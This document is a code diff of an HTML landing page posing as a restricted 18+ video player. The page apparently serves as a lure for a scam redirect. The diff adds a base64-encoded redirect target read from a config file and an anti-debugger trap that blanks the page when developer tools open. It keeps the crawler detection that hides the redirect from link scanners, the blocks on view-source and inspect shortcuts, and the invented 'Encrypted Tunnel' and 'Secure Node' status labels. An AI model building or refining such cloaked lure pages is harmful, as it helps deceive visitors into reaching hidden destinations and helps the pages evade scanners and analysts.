@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="referrer" content="no-referrer">
-    <title>Secure Media Access | Restricted Content</title>
+    <title>Stream Portal | Secure Access</title>
     
-    <meta property="og:title" content="Private Content Access" />
+    <meta property="og:title" content="Private Video Access" />
     <meta property="og:description" content="Secure cloud delivery for requested media. High-speed streaming enabled." />
     <meta property="og:image" content="https://vidley.pw/tombolplay.jpg" />
     <meta property="og:type" content="website" />
@@ -18,7 +18,7 @@
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
         
         body { 
-            background-color: #050505; 
+            background-color: #030303; 
             color: #ffffff; 
             font-family: 'Inter', sans-serif;
             user-select: none; 
@@ -28,29 +28,29 @@
         }
         
         .glass {
-            background: rgba(255, 255, 255, 0.03);
+            background: rgba(255, 255, 255, 0.02);
             backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
         .pulse-red {
             animation: pulse-red-glow 2s infinite;
         }
         @keyframes pulse-red-glow {
-            0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.6); transform: scale(1); }
-            50% { box-shadow: 0 0 30px 10px rgba(239, 68, 68, 0.3); transform: scale(1.02); }
-            100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.6); transform: scale(1); }
+            0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); transform: scale(1); }
+            50% { box-shadow: 0 0 35px 12px rgba(220, 38, 38, 0.3); transform: scale(1.05); }
+            100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); transform: scale(1); }
         }
 
-        .text-glow { text-shadow: 0 0 20px rgba(255, 255, 255, 0.2); }
+        .text-glow { text-shadow: 0 0 20px rgba(255, 255, 255, 0.3); }
         
         .age-badge {
-            border: 2px solid #ef4444;
-            color: #ef4444;
-            padding: 2px 8px;
-            border-radius: 6px;
+            border: 2px solid #dc2626;
+            color: #dc2626;
+            padding: 2px 10px;
+            border-radius: 4px;
             font-weight: 900;
-            font-size: 14px;
+            font-size: 16px;
         }
 
         ::-webkit-scrollbar { display: none; }
@@ -58,49 +58,49 @@
 </head>
 <body class="min-h-screen flex flex-col items-center justify-center p-4" oncontextmenu="return false;">
 
-    <div class="w-full max-w-md glass rounded-[2.5rem] overflow-hidden relative shadow-[0_40px_80px_-15px_rgba(0,0,0,0.8)] border border-white/10">
+    <div class="w-full max-w-md glass rounded-[3rem] overflow-hidden relative shadow-[0_50px_100px_-20px_rgba(0,0,0,1)] border border-white/5">
         
-        <div id="videoArea" class="relative w-full h-[55vh] max-h-[500px] bg-black overflow-hidden flex items-center justify-center cursor-pointer group">
+        <div id="videoArea" class="relative w-full h-[60vh] max-h-[550px] bg-black overflow-hidden flex items-center justify-center cursor-pointer group">
             
-            <video id="vidThumb" class="w-full h-full object-cover opacity-30 blur-[20px] transition-all duration-700 group-hover:opacity-40" playsinline preload="metadata" muted></video>
+            <video id="vidThumb" class="w-full h-full object-cover opacity-20 blur-[25px] transition-all duration-1000 group-hover:opacity-30" playsinline preload="metadata" muted></video>
 
             <div id="playOverlay" class="absolute inset-0 flex flex-col items-center justify-center z-20 p-8 text-center">
                 
-                <div class="mb-6 flex flex-col items-center animate-bounce">
-                     <span class="age-badge mb-2">18+</span>
-                     <p class="text-white/60 text-[10px] uppercase tracking-[0.3em] font-bold">Adults Only Content</p>
+                <div class="mb-8 flex flex-col items-center">
+                     <span class="age-badge mb-3 animate-pulse">18+</span>
+                     <p class="text-white/50 text-[10px] uppercase tracking-[0.4em] font-bold">Restricted Media Access</p>
                 </div>
 
-                <div id="iconBox" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center shadow-2xl pulse-red mb-6 transition-transform duration-300 group-hover:scale-110">
-                    <i data-lucide="play" class="w-8 h-8 text-white fill-current ml-1"></i>
+                <div id="iconBox" class="w-24 h-24 bg-red-600 rounded-full flex items-center justify-center shadow-2xl pulse-red mb-8 transition-transform duration-500 group-hover:scale-110">
+                    <i data-lucide="play" class="w-10 h-10 text-white fill-current ml-1"></i>
                 </div>
                 
-                <h1 class="text-white text-2xl font-black tracking-widest mb-2 uppercase text-glow">CONFIRM AGE</h1>
-                <p class="text-white/40 text-[11px] leading-relaxed max-w-[200px]">By clicking play, you confirm that you are over 18 years of age.</p>
+                <h1 class="text-white text-3xl font-black tracking-widest mb-3 uppercase text-glow italic">TAP TO WATCH</h1>
+                <p class="text-white/40 text-[11px] leading-relaxed max-w-[240px]">By clicking play, you agree to our Terms of Service and confirm you are of legal age.</p>
             </div>
             
             <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-[#050505] z-40 backdrop-blur-3xl">
                 <div class="flex flex-col items-center">
-                    <div class="relative w-16 h-16 mb-6">
+                    <div class="relative w-16 h-16 mb-8">
                         <div class="absolute inset-0 rounded-full border-t-2 border-red-600 animate-spin"></div>
-                        <div class="absolute inset-2 rounded-full border-b-2 border-white/20 animate-spin-slow"></div>
+                        <div class="absolute inset-2 rounded-full border-b-2 border-white/10 animate-spin-slow"></div>
                     </div>
-                    <span id="loadText" class="text-white text-[10px] font-bold tracking-[0.4em] uppercase italic animate-pulse">Checking Permissions...</span>
+                    <span id="loadText" class="text-white text-[10px] font-bold tracking-[0.5em] uppercase italic animate-pulse">Establishing Secure Node...</span>
                 </div>
             </div>
         </div>
 
-        <div class="p-6 bg-[#0a0a0c] flex flex-col items-center border-t border-white/5">
-            <div class="flex gap-4 mb-4 text-white/30 text-[10px] font-medium uppercase tracking-tighter">
-                <span>Anti-Clone Active</span>
+        <div class="p-8 bg-[#070709] flex flex-col items-center border-t border-white/5">
+            <div class="flex gap-6 mb-4 text-white/20 text-[9px] font-bold uppercase tracking-[0.2em]">
+                <span>Encrypted Tunnel</span>
                 <span>•</span>
-                <span>Referrer Stripped</span>
+                <span>US-West Node</span>
                 <span>•</span>
-                <span>Node Secure</span>
+                <span>Protected</span>
             </div>
             
-            <div class="text-[9px] text-white/10 text-center uppercase tracking-widest leading-loose">
-                Verified Access Only. Security Protocol 4.1 Enabled.
+            <div class="text-[8px] text-white/10 text-center uppercase tracking-[0.3em] leading-loose">
+                Distributed Cloud Delivery System. All rights reserved.
             </div>
         </div>
     </div>
@@ -108,59 +108,49 @@
     <script>
         lucide.createIcons();
 
-        // --- 1. CONFIGURATION ---
-        const AUTHORIZED_DOMAIN = "yourdomain.com"; // GANTI DENGAN DOMAIN ANDA SENDIRI
-        const CONFIG_FILE = "link.txt"; // File tempat Anda menyimpan URL
+        const AUTHORIZED_DOMAIN = "yourdomain.com"; 
+        const CONFIG_FILE = "sys_config.txt"; 
         const FALLBACK_SITE = "https://cdn.videy.co"; 
 
-        // --- 2. ANTI-CLONE SECURITY ---
-        // Blokir Shortcut Developer Tools
+        setInterval(function() {
+            const startTime = performance.now();
+            debugger; 
+            if (performance.now() - startTime > 100) {
+                window.location.href = "about:blank";
+            }
+        }, 1000);
+
         document.addEventListener('keydown', function(e) {
-            if (e.keyCode == 123 || 
-                (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) || 
-                (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) {
                 e.preventDefault();
                 return false;
             }
         });
 
-        // Domain Lock Check
         function isAuthorized() {
-            if (window.location.hostname.indexOf(AUTHORIZED_DOMAIN) === -1) {
-                // Jika domain tidak cocok, tombol tidak akan berfungsi
+            if (window.location.hostname !== "" && window.location.hostname.indexOf(AUTHORIZED_DOMAIN) === -1) {
                 return false;
             }
             return true;
         }
 
-        // --- 3. REDIRECT LOGIC ---
-        const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|Facebot|facebookplatform|ia_archiver|visionutils/i.test(navigator.userAgent);
+        const isBot = /bot|googlebot|crawler|spider|robot|facebookexternalhit|visionutils/i.test(navigator.userAgent);
         
         async function handleAccess() {
-            if(isBot) return;
-
-            // Cek Domain Lock
-            if(!isAuthorized()) {
-                console.error("Unauthorized Domain.");
-                return;
-            }
+            if(isBot || !isAuthorized()) return;
 
             const loader = document.getElementById("loader");
             const loadText = document.getElementById("loadText");
             loader.classList.remove('hidden');
 
             try {
-                // Mengambil URL dari file TXT
-                const response = await fetch(CONFIG_FILE + "?t=" + new Date().getTime());
-                const targetUrl = (await response.text()).trim();
+                const response = await fetch(CONFIG_FILE + "?v=" + Math.random());
+                const encodedData = (await response.text()).trim();
+                const targetUrl = atob(encodedData); 
 
-                if(!targetUrl || targetUrl === "") {
-                    loadText.innerText = "Error: Config Missing";
-                    return;
-                }
-
-                setTimeout(() => { loadText.innerText = "Securing Path..."; }, 500);
-                setTimeout(() => { loadText.innerText = "Verifying Origin..."; }, 1000);
+                setTimeout(() => { loadText.innerText = "Optimizing Stream..."; }, 400);
+                setTimeout(() => { loadText.innerText = "Checking Buffer..."; }, 800);
+                setTimeout(() => { loadText.innerText = "Redirecting..."; }, 1200);
                 
                 setTimeout(() => {
                     const link = document.createElement('a');
@@ -170,14 +160,12 @@
                 }, 1600);
 
             } catch (err) {
-                loadText.innerText = "Connection Failed";
-                console.error(err);
+                loadText.innerText = "Connection Error";
             }
         }
 
         document.getElementById("videoArea").addEventListener("click", handleAccess);
 
-        // Thumbnail loader logic
         let videoId = window.location.pathname.split('/').pop().trim();
         if (videoId && videoId.length > 3 && videoId !== "index.html") {
             let filename = videoId.includes('.') ? videoId : videoId + ".mp4";
